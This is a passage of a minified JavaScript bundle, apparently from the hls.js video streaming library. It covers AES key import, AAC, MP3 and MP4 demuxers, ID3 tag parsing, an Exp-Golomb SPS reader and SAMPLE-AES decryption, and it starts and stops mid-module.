e=this.decryptor;e&&(e.destroy(),this.decryptor=void 0)},e}();t.default=c},"./src/crypt/fast-aes-key.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(e,t){this.subtle=e,this.key=t}return e.prototype.expandKey=function(){return this.subtle.importKey("raw",this.key,{name:"AES-CBC"},!1,["encrypt","decrypt"])},e}();t.default=i},"./src/demux/aacdemuxer.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/demux/adts.js"),n=r("./src/utils/logger.js"),a=r("./src/demux/id3.js"),s=function(){function t(e,t,r){this.observer=e,this.config=r,this.remuxer=t}return t.prototype.resetInitSegment=function(e,t,r,i){this._audioTrack={container:"audio/adts",type:"audio",id:0,sequenceNumber:0,isAAC:!0,samples:[],len:0,manifestCodec:t,duration:i,inputTimeScale:9e4}},t.prototype.resetTimeStamp=function(){},t.probe=function(e){if(!e)return!1;for(var t=(a.default.getID3Data(e,0)||[]).length,r=e.length;t<r;t++)if(i.probe(e,t))return n.logger.log("ADTS sync word found !"),!0;return!1},t.prototype.append=function(t,r,s,o){for(var u=this._audioTrack,l=a.default.getID3Data(t,0)||[],c=a.default.getTimeStamp(l),d=e.isFinite(c)?90*c:9e4*r,f=0,h=d,p=t.length,g=l.length,y=[{pts:h,dts:h,data:l}];g<p-1;)if(i.isHeader(t,g)&&g+5<p){i.initTrackConfig(u,this.observer,t,g,u.manifestCodec);var v=i.appendFrame(u,t,g,d,f);if(!v){n.logger.log("Unable to parse AAC frame");break}g+=v.length,h=v.sample.pts,f++}else a.default.isHeader(t,g)?(l=a.default.getID3Data(t,g),y.push({pts:h,dts:h,data:l}),g+=l.length):g++;this.remuxer.remux(u,{samples:[]},{samples:y,inputTimeScale:9e4},{samples:[]},r,s,o)},t.prototype.destroy=function(){},t}();t.default=s}).call(this,r("./src/polyfills/number.js").Number)},"./src/demux/adts.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/logger.js"),n=r("./src/errors.js"),a=r("./src/events.js");function s(e,t,r,s){var o,u,l,c,d,f=navigator.userAgent.toLowerCase(),h=s,p=[96e3,88200,64e3,48e3,44100,32e3,24e3,22050,16e3,12e3,11025,8e3,7350];if(o=1+((192&t[r+2])>>>6),!((u=(60&t[r+2])>>>2)>p.length-1))return c=(1&t[r+2])<<2,c|=(192&t[r+3])>>>6,i.logger.log("manifest codec:"+s+",ADTS data:type:"+o+",sampleingIndex:"+u+"["+p[u]+"Hz],channelConfig:"+c),/firefox/i.test(f)?u>=6?(o=5,d=new Array(4),l=u-3):(o=2,d=new Array(2),l=u):-1!==f.indexOf("android")?(o=2,d=new Array(2),l=u):(o=5,d=new Array(4),s&&(-1!==s.indexOf("mp4a.40.29")||-1!==s.indexOf("mp4a.40.5"))||!s&&u>=6?l=u-3:((s&&-1!==s.indexOf("mp4a.40.2")&&(u>=6&&1===c||/vivaldi/i.test(f))||!s&&1===c)&&(o=2,d=new Array(2)),l=u)),d[0]=o<<3,d[0]|=(14&u)>>1,d[1]|=(1&u)<<7,d[1]|=c<<3,5===o&&(d[1]|=(14&l)>>1,d[2]=(1&l)<<7,d[2]|=8,d[3]=0),{config:d,samplerate:p[u],channelCount:c,codec:"mp4a.40."+o,manifestCodec:h};e.trigger(a.default.ERROR,{type:n.ErrorTypes.MEDIA_ERROR,details:n.ErrorDetails.FRAG_PARSING_ERROR,fatal:!0,reason:"invalid ADTS sampling index:"+u})}function o(e,t){return 255===e[t]&&240==(246&e[t+1])}function u(e,t){return 1&e[t+1]?7:9}function l(e,t){return(3&e[t+3])<<11|e[t+4]<<3|(224&e[t+5])>>>5}function c(e){return 9216e4/e}function d(e,t,r,i,n){var a,s,o=e.length;if(a=u(e,t),s=l(e,t),(s-=a)>0&&t+a+s<=o)return{headerLength:a,frameLength:s,stamp:r+i*n}}t.getAudioConfig=s,t.isHeaderPattern=o,t.getHeaderLength=u,t.getFullFrameLength=l,t.isHeader=function(e,t){return!!(t+1<e.length&&o(e,t))},t.probe=function(e,t){if(t+1<e.length&&o(e,t)){var r=u(e,t);t+5<e.length&&(r=l(e,t));var i=t+r;if(i===e.length||i+1<e.length&&o(e,i))return!0}return!1},t.initTrackConfig=function(e,t,r,n,a){if(!e.samplerate){var o=s(t,r,n,a);e.config=o.config,e.samplerate=o.samplerate,e.channelCount=o.channelCount,e.codec=o.codec,e.manifestCodec=o.manifestCodec,i.logger.log("parsed codec:"+e.codec+",rate:"+o.samplerate+",nb channel:"+o.channelCount)}},t.getFrameDuration=c,t.parseFrameHeader=d,t.appendFrame=function(e,t,r,i,n){var a=d(t,r,i,n,c(e.samplerate));if(a){var s=a.stamp,o=a.headerLength,u=a.frameLength,l={unit:t.subarray(r+o,r+o+u),pts:s,dts:s};return e.samples.push(l),e.len+=u,{sample:l,length:u+o}}}},"./src/demux/demuxer-inline.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i,n=r("./src/events.js"),a=r("./src/errors.js"),s=r("./src/crypt/decrypter.js"),o=r("./src/demux/aacdemuxer.js"),u=r("./src/demux/mp4demuxer.js"),l=r("./src/demux/tsdemuxer.js"),c=r("./src/demux/mp3demuxer.js"),d=r("./src/remux/mp4-remuxer.js"),f=r("./src/remux/passthrough-remuxer.js"),h=r("./src/utils/get-self-scope.js"),p=r("./src/utils/logger.js"),g=h.getSelfScope();try{i=g.performance.now.bind(g.performance)}catch(e){p.logger.debug("Unable to use Performance API on this environment"),i=g.Date.now}var y=function(){function e(e,t,r,i){this.observer=e,this.typeSupported=t,this.config=r,this.vendor=i}return e.prototype.destroy=function(){var e=this.demuxer;e&&e.destroy()},e.prototype.push=function(e,t,r,a,o,u,l,c,d,f,h,p){var g=this;if(e.byteLength>0&&null!=t&&null!=t.key&&"AES-128"===t.method){var y=this.decrypter;null==y&&(y=this.decrypter=new s.default(this.observer,this.config));var v=i();y.decrypt(e,t.key.buffer,t.iv.buffer,function(e){var s=i();g.observer.trigger(n.default.FRAG_DECRYPTED,{stats:{tstart:v,tdecrypt:s}}),g.pushDecrypted(new Uint8Array(e),t,new Uint8Array(r),a,o,u,l,c,d,f,h,p)})}else this.pushDecrypted(new Uint8Array(e),t,new Uint8Array(r),a,o,u,l,c,d,f,h,p)},e.prototype.pushDecrypted=function(e,t,r,i,s,h,p,g,y,v,m,L){var M=this.demuxer;if(!M||(p||g)&&!this.probe(e)){for(var T=this.observer,A=this.typeSupported,w=this.config,E=[{demux:l.default,remux:d.default},{demux:u.default,remux:f.default},{demux:o.default,remux:d.default},{demux:c.default,remux:d.default}],S=0,D=E.length;S<D;S++){var b=E[S],j=b.demux.probe;if(j(e)){var C=this.remuxer=new b.remux(T,w,A,this.vendor);M=new b.demux(T,C,w,A),this.probe=j;break}}if(!M)return void T.trigger(n.default.ERROR,{type:a.ErrorTypes.MEDIA_ERROR,details:a.ErrorDetails.FRAG_PARSING_ERROR,fatal:!0,reason:"no demux matching with content found"});this.demuxer=M}var I=this.remuxer;(p||g)&&(M.resetInitSegment(r,i,s,v),I.resetInitSegment()),p&&(M.resetTimeStamp(L),I.resetTimeStamp(L)),"function"==typeof M.setDecryptData&&M.setDecryptData(t),M.append(e,h,y,m)},e}();t.default=y},"./src/demux/demuxer-worker.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/demux/demuxer-inline.js"),n=r("./src/events.js"),a=r("./src/utils/logger.js"),s=r("./node_modules/node-libs-browser/node_modules/events/events.js");t.default=function(e){var t=new s.EventEmitter;t.trigger=function(e){for(var r=[],i=1;i<arguments.length;i++)r[i-1]=arguments[i];t.emit.apply(t,[e,e].concat(r))},t.off=function(e){for(var r=[],i=1;i<arguments.length;i++)r[i-1]=arguments[i];t.removeListener.apply(t,[e].concat(r))};var r=function(t,r){e.postMessage({event:t,data:r})};e.addEventListener("message",function(n){var s=n.data;switch(s.cmd){case"init":var o=JSON.parse(s.config);e.demuxer=new i.default(t,s.typeSupported,o,s.vendor),a.enableLogs(o.debug),r("init",null);break;case"demux":e.demuxer.push(s.data,s.decryptdata,s.initSegment,s.audioCodec,s.videoCodec,s.timeOffset,s.discontinuity,s.trackSwitch,s.contiguous,s.duration,s.accurateTimeOffset,s.defaultInitPTS)}}),t.on(n.default.FRAG_DECRYPTED,r),t.on(n.default.FRAG_PARSING_INIT_SEGMENT,r),t.on(n.default.FRAG_PARSED,r),t.on(n.default.ERROR,r),t.on(n.default.FRAG_PARSING_METADATA,r),t.on(n.default.FRAG_PARSING_USERDATA,r),t.on(n.default.INIT_PTS_FOUND,r),t.on(n.default.FRAG_PARSING_DATA,function(t,r){var i=[],n={event:t,data:r};r.data1&&(n.data1=r.data1.buffer,i.push(r.data1.buffer),delete r.data1),r.data2&&(n.data2=r.data2.buffer,i.push(r.data2.buffer),delete r.data2),e.postMessage(n,i)})}},"./src/demux/demuxer.js":function(e,t,r){"use strict";(function(e){Object.defineProperty(t,"__esModule",{value:!0});var i=r("./node_modules/webworkify-webpack/index.js"),n=r("./src/events.js"),a=r("./src/demux/demuxer-inline.js"),s=r("./src/utils/logger.js"),o=r("./src/errors.js"),u=r("./src/utils/mediasource-helper.js"),l=r("./src/utils/get-self-scope.js"),c=r("./src/observer.js"),d=l.getSelfScope(),f=u.getMediaSource(),h=function(){function t(e,t){var r=this;this.hls=e,this.id=t;var u=this.observer=new c.Observer,l=e.config,h=function(t,i){(i=i||{}).frag=r.frag,i.id=r.id,e.trigger(t,i)};u.on(n.default.FRAG_DECRYPTED,h),u.on(n.default.FRAG_PARSING_INIT_SEGMENT,h),u.on(n.default.FRAG_PARSING_DATA,h),u.on(n.default.FRAG_PARSED,h),u.on(n.default.ERROR,h),u.on(n.default.FRAG_PARSING_METADATA,h),u.on(n.default.FRAG_PARSING_USERDATA,h),u.on(n.default.INIT_PTS_FOUND,h);var p={mp4:f.isTypeSupported("video/mp4"),mpeg:f.isTypeSupported("audio/mpeg"),mp3:f.isTypeSupported('audio/mp4; codecs="mp3"')},g=navigator.vendor;if(l.enableWorker&&"undefined"!=typeof Worker){s.logger.log("demuxing in webworker");var y=void 0;try{y=this.w=i("./src/demux/demuxer-worker.js"),this.onwmsg=this.onWorkerMessage.bind(this),y.addEventListener("message",this.onwmsg),y.onerror=function(t){e.trigger(n.default.ERROR,{type:o.ErrorTypes.OTHER_ERROR,details:o.ErrorDetails.INTERNAL_EXCEPTION,fatal:!0,event:"demuxerWorker",err:{message:t.message+" ("+t.filename+":"+t.lineno+")"}})},y.postMessage({cmd:"init",typeSupported:p,vendor:g,id:t,config:JSON.stringify(l)})}catch(e){s.logger.warn("Error in worker:",e),s.logger.error("Error while initializing DemuxerWorker, fallback on DemuxerInline"),y&&d.URL.revokeObjectURL(y.objectURL),this.demuxer=new a.default(u,p,l,g),this.w=void 0}}else this.demuxer=new a.default(u,p,l,g)}return t.prototype.destroy=function(){var e=this.w;if(e)e.removeEventListener("message",this.onwmsg),e.terminate(),this.w=null;else{var t=this.demuxer;t&&(t.destroy(),this.demuxer=null)}var r=this.observer;r&&(r.removeAllListeners(),this.observer=null)},t.prototype.push=function(t,r,i,n,a,o,u,l){var c=this.w,d=e.isFinite(a.startPTS)?a.startPTS:a.start,f=a.decryptdata,h=this.frag,p=!(h&&a.cc===h.cc),g=!(h&&a.level===h.level),y=h&&a.sn===h.sn+1,v=!g&&y;if(p&&s.logger.log(this.id+":discontinuity detected"),g&&s.logger.log(this.id+":switch detected"),this.frag=a,c)c.postMessage({cmd:"demux",data:t,decryptdata:f,initSegment:r,audioCodec:i,videoCodec:n,timeOffset:d,discontinuity:p,trackSwitch:g,contiguous:v,duration:o,accurateTimeOffset:u,defaultInitPTS:l},t instanceof ArrayBuffer?[t]:[]);else{var m=this.demuxer;m&&m.push(t,f,r,i,n,d,p,g,v,o,u,l)}},t.prototype.onWorkerMessage=function(e){var t=e.data,r=this.hls;switch(t.event){case"init":d.URL.revokeObjectURL(this.w.objectURL);break;case n.default.FRAG_PARSING_DATA:t.data.data1=new Uint8Array(t.data1),t.data2&&(t.data.data2=new Uint8Array(t.data2));default:t.data=t.data||{},t.data.frag=this.frag,t.data.id=this.id,r.trigger(t.event,t.data)}},t}();t.default=h}).call(this,r("./src/polyfills/number.js").Number)},"./src/demux/exp-golomb.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/logger.js"),n=function(){function e(e){this.data=e,this.bytesAvailable=e.byteLength,this.word=0,this.bitsAvailable=0}return e.prototype.loadWord=function(){var e=this.data,t=this.bytesAvailable,r=e.byteLength-t,i=new Uint8Array(4),n=Math.min(4,t);if(0===n)throw new Error("no bytes available");i.set(e.subarray(r,r+n)),this.word=new DataView(i.buffer).getUint32(0),this.bitsAvailable=8*n,this.bytesAvailable-=n},e.prototype.skipBits=function(e){var t;this.bitsAvailable>e?(this.word<<=e,this.bitsAvailable-=e):(e-=this.bitsAvailable,e-=(t=e>>3)>>3,this.bytesAvailable-=t,this.loadWord(),this.word<<=e,this.bitsAvailable-=e)},e.prototype.readBits=function(e){var t=Math.min(this.bitsAvailable,e),r=this.word>>>32-t;return e>32&&i.logger.error("Cannot read more than 32 bits at a time"),this.bitsAvailable-=t,this.bitsAvailable>0?this.word<<=t:this.bytesAvailable>0&&this.loadWord(),(t=e-t)>0&&this.bitsAvailable?r<<t|this.readBits(t):r},e.prototype.skipLZ=function(){var e;for(e=0;e<this.bitsAvailable;++e)if(0!=(this.word&2147483648>>>e))return this.word<<=e,this.bitsAvailable-=e,e;return this.loadWord(),e+this.skipLZ()},e.prototype.skipUEG=function(){this.skipBits(1+this.skipLZ())},e.prototype.skipEG=function(){this.skipBits(1+this.skipLZ())},e.prototype.readUEG=function(){var e=this.skipLZ();return this.readBits(e+1)-1},e.prototype.readEG=function(){var e=this.readUEG();return 1&e?1+e>>>1:-1*(e>>>1)},e.prototype.readBoolean=function(){return 1===this.readBits(1)},e.prototype.readUByte=function(){return this.readBits(8)},e.prototype.readUShort=function(){return this.readBits(16)},e.prototype.readUInt=function(){return this.readBits(32)},e.prototype.skipScalingList=function(e){var t,r=8,i=8;for(t=0;t<e;t++)0!==i&&(i=(r+this.readEG()+256)%256),r=0===i?r:i},e.prototype.readSPS=function(){var e,t,r,i,n,a,s,o=0,u=0,l=0,c=0,d=this.readUByte.bind(this),f=this.readBits.bind(this),h=this.readUEG.bind(this),p=this.readBoolean.bind(this),g=this.skipBits.bind(this),y=this.skipEG.bind(this),v=this.skipUEG.bind(this),m=this.skipScalingList.bind(this);if(d(),e=d(),f(5),g(3),d(),v(),100===e||110===e||122===e||244===e||44===e||83===e||86===e||118===e||128===e){var L=h();if(3===L&&g(1),v(),v(),g(1),p())for(a=3!==L?8:12,s=0;s<a;s++)p()&&m(s<6?16:64)}v();var M=h();if(0===M)h();else if(1===M)for(g(1),y(),y(),t=h(),s=0;s<t;s++)y();v(),g(1),r=h(),i=h(),0===(n=f(1))&&g(1),g(1),p()&&(o=h(),u=h(),l=h(),c=h());var T=[1,1];if(p()&&p())switch(d()){case 1:T=[1,1];break;case 2:T=[12,11];break;case 3:T=[10,11];break;case 4:T=[16,11];break;case 5:T=[40,33];break;case 6:T=[24,11];break;case 7:T=[20,11];break;case 8:T=[32,11];break;case 9:T=[80,33];break;case 10:T=[18,11];break;case 11:T=[15,11];break;case 12:T=[64,33];break;case 13:T=[160,99];break;case 14:T=[4,3];break;case 15:T=[3,2];break;case 16:T=[2,1];break;case 255:T=[d()<<8|d(),d()<<8|d()]}return{width:Math.ceil(16*(r+1)-2*o-2*u),height:(2-n)*(i+1)*16-(n?2:4)*(l+c),pixelRatio:T}},e.prototype.readSliceType=function(){return this.readUByte(),this.readUEG(),this.readUEG()},e}();t.default=n},"./src/demux/id3.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=function(){function e(){}return e.isHeader=function(e,t){return t+10<=e.length&&73===e[t]&&68===e[t+1]&&51===e[t+2]&&e[t+3]<255&&e[t+4]<255&&e[t+6]<128&&e[t+7]<128&&e[t+8]<128&&e[t+9]<128},e.isFooter=function(e,t){return t+10<=e.length&&51===e[t]&&68===e[t+1]&&73===e[t+2]&&e[t+3]<255&&e[t+4]<255&&e[t+6]<128&&e[t+7]<128&&e[t+8]<128&&e[t+9]<128},e.getID3Data=function(t,r){for(var i=r,n=0;e.isHeader(t,r);){n+=10,n+=e._readSize(t,r+6),e.isFooter(t,r+10)&&(n+=10),r+=n}if(n>0)return t.subarray(i,i+n)},e._readSize=function(e,t){var r=0;return r=(127&e[t])<<21,r|=(127&e[t+1])<<14,r|=(127&e[t+2])<<7,r|=127&e[t+3]},e.getTimeStamp=function(t){for(var r=e.getID3Frames(t),i=0;i<r.length;i++){var n=r[i];if(e.isTimeStampFrame(n))return e._readTimeStamp(n)}},e.isTimeStampFrame=function(e){return e&&"PRIV"===e.key&&"com.apple.streaming.transportStreamTimestamp"===e.info},e._getFrameData=function(t){var r=String.fromCharCode(t[0],t[1],t[2],t[3]),i=e._readSize(t,4);return{type:r,size:i,data:t.subarray(10,10+i)}},e.getID3Frames=function(t){for(var r=0,i=[];e.isHeader(t,r);){for(var n=e._readSize(t,r+6),a=(r+=10)+n;r+8<a;){var s=e._getFrameData(t.subarray(r)),o=e._decodeFrame(s);o&&i.push(o),r+=s.size+10}e.isFooter(t,r)&&(r+=10)}return i},e._decodeFrame=function(t){return"PRIV"===t.type?e._decodePrivFrame(t):"T"===t.type[0]?e._decodeTextFrame(t):"W"===t.type[0]?e._decodeURLFrame(t):void 0},e._readTimeStamp=function(e){if(8===e.data.byteLength){var t=new Uint8Array(e.data),r=1&t[3],i=(t[4]<<23)+(t[5]<<15)+(t[6]<<7)+t[7];return i/=45,r&&(i+=47721858.84),Math.round(i)}},e._decodePrivFrame=function(t){if(!(t.size<2)){var r=e._utf8ArrayToStr(t.data,!0),i=new Uint8Array(t.data.subarray(r.length+1));return{key:t.type,info:r,data:i.buffer}}},e._decodeTextFrame=function(t){if(!(t.size<2)){if("TXXX"===t.type){var r=1,i=e._utf8ArrayToStr(t.data.subarray(r));r+=i.length+1;var n=e._utf8ArrayToStr(t.data.subarray(r));return{key:t.type,info:i,data:n}}var a=e._utf8ArrayToStr(t.data.subarray(1));return{key:t.type,data:a}}},e._decodeURLFrame=function(t){if("WXXX"===t.type){if(t.size<2)return;var r=1,i=e._utf8ArrayToStr(t.data.subarray(r));r+=i.length+1;var n=e._utf8ArrayToStr(t.data.subarray(r));return{key:t.type,info:i,data:n}}var a=e._utf8ArrayToStr(t.data);return{key:t.type,data:a}},e._utf8ArrayToStr=function(e,t){void 0===t&&(t=!1);for(var r,i,n,a=e.length,s="",o=0;o<a;){if(0===(r=e[o++])&&t)return s;if(0!==r&&3!==r)switch(r>>4){case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:s+=String.fromCharCode(r);break;case 12:case 13:i=e[o++],s+=String.fromCharCode((31&r)<<6|63&i);break;case 14:i=e[o++],n=e[o++],s+=String.fromCharCode((15&r)<<12|(63&i)<<6|(63&n)<<0)}}return s},e}(),n=i._utf8ArrayToStr;t.utf8ArrayToStr=n,t.default=i},"./src/demux/mp3demuxer.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/demux/id3.js"),n=r("./src/utils/logger.js"),a=r("./src/demux/mpegaudio.js"),s=function(){function e(e,t,r){this.observer=e,this.config=r,this.remuxer=t}return e.prototype.resetInitSegment=function(e,t,r,i){this._audioTrack={container:"audio/mpeg",type:"audio",id:-1,sequenceNumber:0,isAAC:!1,samples:[],len:0,manifestCodec:t,duration:i,inputTimeScale:9e4}},e.prototype.resetTimeStamp=function(){},e.probe=function(e){var t,r,s=i.default.getID3Data(e,0);if(s&&void 0!==i.default.getTimeStamp(s))for(t=s.length,r=Math.min(e.length-1,t+100);t<r;t++)if(a.default.probe(e,t))return n.logger.log("MPEG Audio sync word found !"),!0;return!1},e.prototype.append=function(e,t,r,n){for(var s=i.default.getID3Data(e,0),o=i.default.getTimeStamp(s),u=o?90*o:9e4*t,l=s.length,c=e.length,d=0,f=0,h=this._audioTrack,p=[{pts:u,dts:u,data:s}];l<c;)if(a.default.isHeader(e,l)){var g=a.default.appendFrame(h,e,l,u,d);if(!g)break;l+=g.length,f=g.sample.pts,d++}else i.default.isHeader(e,l)?(s=i.default.getID3Data(e,l),p.push({pts:f,dts:f,data:s}),l+=s.length):l++;this.remuxer.remux(h,{samples:[]},{samples:p,inputTimeScale:9e4},{samples:[]},t,r,n)},e.prototype.destroy=function(){},e}();t.default=s},"./src/demux/mp4demuxer.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/utils/logger.js"),n=r("./src/events.js"),a=Math.pow(2,32)-1,s=function(){function e(e,t){this.observer=e,this.remuxer=t}return e.prototype.resetTimeStamp=function(e){this.initPTS=e},e.prototype.resetInitSegment=function(t,r,i,a){if(t&&t.byteLength){var s=this.initData=e.parseInitSegment(t);null==r&&(r="mp4a.40.5"),null==i&&(i="avc1.42e01e");var o={};s.audio&&s.video?o.audiovideo={container:"video/mp4",codec:r+","+i,initSegment:a?t:null}:(s.audio&&(o.audio={container:"audio/mp4",codec:r,initSegment:a?t:null}),s.video&&(o.video={container:"video/mp4",codec:i,initSegment:a?t:null})),this.observer.trigger(n.default.FRAG_PARSING_INIT_SEGMENT,{tracks:o})}else r&&(this.audioCodec=r),i&&(this.videoCodec=i)},e.probe=function(t){return e.findBox({data:t,start:0,end:Math.min(t.length,16384)},["moof"]).length>0},e.bin2str=function(e){return String.fromCharCode.apply(null,e)},e.readUint16=function(e,t){e.data&&(t+=e.start,e=e.data);var r=e[t]<<8|e[t+1];return r<0?65536+r:r},e.readUint32=function(e,t){e.data&&(t+=e.start,e=e.data);var r=e[t]<<24|e[t+1]<<16|e[t+2]<<8|e[t+3];return r<0?4294967296+r:r},e.writeUint32=function(e,t,r){e.data&&(t+=e.start,e=e.data),e[t]=r>>24,e[t+1]=r>>16&255,e[t+2]=r>>8&255,e[t+3]=255&r},e.findBox=function(t,r){var i,n,a,s,o,u,l=[];if(t.data?(o=t.start,a=t.end,t=t.data):(o=0,a=t.byteLength),!r.length)return null;for(i=o;i<a;)u=(n=e.readUint32(t,i))>1?i+n:a,e.bin2str(t.subarray(i+4,i+8))===r[0]&&(1===r.length?l.push({data:t,start:i+8,end:u}):(s=e.findBox({data:t,start:i+8,end:u},r.slice(1))).length&&(l=l.concat(s))),i=u;return l},e.parseSegmentIndex=function(t){var r,i=e.findBox(t,["moov"])[0],n=i?i.end:null,a=0,s=e.findBox(t,["sidx"]);if(!s||!s[0])return null;r=[];var o=(s=s[0]).data[0];a=0===o?8:16;var u=e.readUint32(s,a);a+=4;a+=0===o?8:16,a+=2;var l=s.end+0,c=e.readUint16(s,a);a+=2;for(var d=0;d<c;d++){var f=a,h=e.readUint32(s,f);f+=4;var p=2147483647&h;if(1===(2147483648&h)>>>31)return void console.warn("SIDX has hierarchical references (not supported)");var g=e.readUint32(s,f);f+=4,r.push({referenceSize:p,subsegmentDuration:g,info:{duration:g/u,start:l,end:l+p-1}}),l+=p,a=f+=4}return{earliestPresentationTime:0,timescale:u,version:o,referencesCount:c,references:r,moovEndOffset:n}},e.parseInitSegment=function(t){var r=[];return e.findBox(t,["moov","trak"]).forEach(function(t){var n=e.findBox(t,["tkhd"])[0];if(n){var a=n.data[n.start],s=0===a?12:20,o=e.readUint32(n,s),u=e.findBox(t,["mdia","mdhd"])[0];if(u){s=0===(a=u.data[u.start])?12:20;var l=e.readUint32(u,s),c=e.findBox(t,["mdia","hdlr"])[0];if(c){var d={soun:"audio",vide:"video"}[e.bin2str(c.data.subarray(c.start+8,c.start+12))];if(d){var f=e.findBox(t,["mdia","minf","stbl","stsd"]);if(f.length){f=f[0];var h=e.bin2str(f.data.subarray(f.start+12,f.start+16));i.logger.log("MP4Demuxer:"+d+":"+h+" found")}r[o]={timescale:l,type:d},r[d]={timescale:l,id:o}}}}}}),r},e.getStartDTS=function(t,r){var i,n,a;return i=e.findBox(r,["moof","traf"]),n=[].concat.apply([],i.map(function(r){return e.findBox(r,["tfhd"]).map(function(i){var n,a;return n=e.readUint32(i,4),a=t[n].timescale||9e4,e.findBox(r,["tfdt"]).map(function(t){var r,i;return r=t.data[t.start],i=e.readUint32(t,4),1===r&&(i*=Math.pow(2,32),i+=e.readUint32(t,8)),i})[0]/a})})),a=Math.min.apply(null,n),isFinite(a)?a:0},e.offsetStartDTS=function(t,r,i){e.findBox(r,["moof","traf"]).map(function(r){return e.findBox(r,["tfhd"]).map(function(n){var s=e.readUint32(n,4),o=t[s].timescale||9e4;e.findBox(r,["tfdt"]).map(function(t){var r=t.data[t.start],n=e.readUint32(t,4);if(0===r)e.writeUint32(t,4,n-i*o);else{n*=Math.pow(2,32),n+=e.readUint32(t,8),n-=i*o,n=Math.max(n,0);var s=Math.floor(n/(a+1)),u=Math.floor(n%(a+1));e.writeUint32(t,4,s),e.writeUint32(t,8,u)}})})})},e.prototype.append=function(t,r,i,a){var s=this.initData;s||(this.resetInitSegment(t,this.audioCodec,this.videoCodec,!1),s=this.initData);var o,u=this.initPTS;if(void 0===u){var l=e.getStartDTS(s,t);this.initPTS=u=l-r,this.observer.trigger(n.default.INIT_PTS_FOUND,{initPTS:u})}e.offsetStartDTS(s,t,u),o=e.getStartDTS(s,t),this.remuxer.remux(s.audio,s.video,null,null,o,i,a,t)},e.prototype.destroy=function(){},e}();t.default=s},"./src/demux/mpegaudio.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i={BitratesMap:[32,64,96,128,160,192,224,256,288,320,352,384,416,448,32,48,56,64,80,96,112,128,160,192,224,256,320,384,32,40,48,56,64,80,96,112,128,160,192,224,256,320,32,48,56,64,80,96,112,128,144,160,176,192,224,256,8,16,24,32,40,48,56,64,80,96,112,128,144,160],SamplingRateMap:[44100,48e3,32e3,22050,24e3,16e3,11025,12e3,8e3],SamplesCoefficients:[[0,72,144,12],[0,0,0,0],[0,72,144,12],[0,144,144,12]],BytesInSlot:[0,1,1,4],appendFrame:function(e,t,r,i,n){if(!(r+24>t.length)){var a=this.parseHeader(t,r);if(a&&r+a.frameLength<=t.length){var s=i+n*(9e4*a.samplesPerFrame/a.sampleRate),o={unit:t.subarray(r,r+a.frameLength),pts:s,dts:s};return e.config=[],e.channelCount=a.channelCount,e.samplerate=a.sampleRate,e.samples.push(o),e.len+=a.frameLength,{sample:o,length:a.frameLength}}}},parseHeader:function(e,t){var r=e[t+1]>>3&3,n=e[t+1]>>1&3,a=e[t+2]>>4&15,s=e[t+2]>>2&3,o=e[t+2]>>1&1;if(1!==r&&0!==a&&15!==a&&3!==s){var u=3===r?3-n:3===n?3:4,l=1e3*i.BitratesMap[14*u+a-1],c=3===r?0:2===r?1:2,d=i.SamplingRateMap[3*c+s],f=e[t+3]>>6==3?1:2,h=i.SamplesCoefficients[r][n],p=i.BytesInSlot[n],g=8*h*p;return{sampleRate:d,channelCount:f,frameLength:parseInt(h*l/d+o,10)*p,samplesPerFrame:g}}},isHeaderPattern:function(e,t){return 255===e[t]&&224==(224&e[t+1])&&0!=(6&e[t+1])},isHeader:function(e,t){return!!(t+1<e.length&&this.isHeaderPattern(e,t))},probe:function(e,t){if(t+1<e.length&&this.isHeaderPattern(e,t)){var r=this.parseHeader(e,t),i=4;r&&r.frameLength&&(i=r.frameLength);var n=t+i;if(n===e.length||n+1<e.length&&this.isHeaderPattern(e,n))return!0}return!1}};t.default=i},"./src/demux/sample-aes.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var i=r("./src/crypt/decrypter.js"),n=function(){function e(e,t,r,n){this.decryptdata=r,this.discardEPB=n,this.decrypter=new i.default(e,t,{removePKCS7Padding:!1})}return e.prototype.decryptBuffer=function(e,t){this.decrypter.decrypt(e,this.decryptdata.key.buffer,this.decryptdata.iv.buffer,t)},e.prototype.decryptAacSample=function(e,t,r,i){var n=e[t].unit,a=n.subarray(16,n.length-n.length%16),s=a.buffer.slice(a.byteOffset,a.byteOffset+a.length),o=this;this.decryptBuffer(s,function(a){a=new Uint8Array(a),n.set(a,16),i||o.decryptAacSamples(e,t+1,r)})},e.prototype.decryptAacSamples=function(e,t,r){for(;;t++){if(t>=e.length)return void r();if(!(e[t].unit.length<32)){var i=this.decrypter.isSync();if(this.decryptAacSample(e,t,r,i),!i)return}}},e.prototype.getAvcEncryptedData=function(e){for(var t=16*Math.floor((e.length-48)/160)+16,r=new Int8Array(t),i=0,n=32;n<=e.length-16;n+=160,i+=16)r.set(e.subarray(n,n+16),i);return r},e.prototype.getAvcDecryptedUnit=function(e,t){t=new Uint8Array(t);for(var r=0,i=32;i<=e.length-16;i+=160,r+=16)e.set(t.subarray(r,r+16),i);return e},e.prototype.decryptAvcSample=function(e,t,r,i,n,a){var s=this.discardEPB(n.data),o=this.getAvcEncryptedData(s),u=this;this.decryptBuffer(o.buffer,function(o){n.data=u.getAvcDecryptedUnit(s,o),a||u.decryptAvcSamples(e,t,r+1,i)})},e.prototype.decryptAvcSamples=function(e,t,r,i){for(;;t++,r=0){if(t>=e.length)return void i();for(var n=e[t].units;!(r>=n.length);r++){var a=n[r];if(!(a.length<=48||1!==a.type&&5!==a.type)){var s=this.decrypter.isSync();if(this.decryptAvcSample(e,t,r,i,a,s),!s)return}}}},e}();t.default=n},"./src/demux/tsdemuxer.js":function(e,t,r){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var 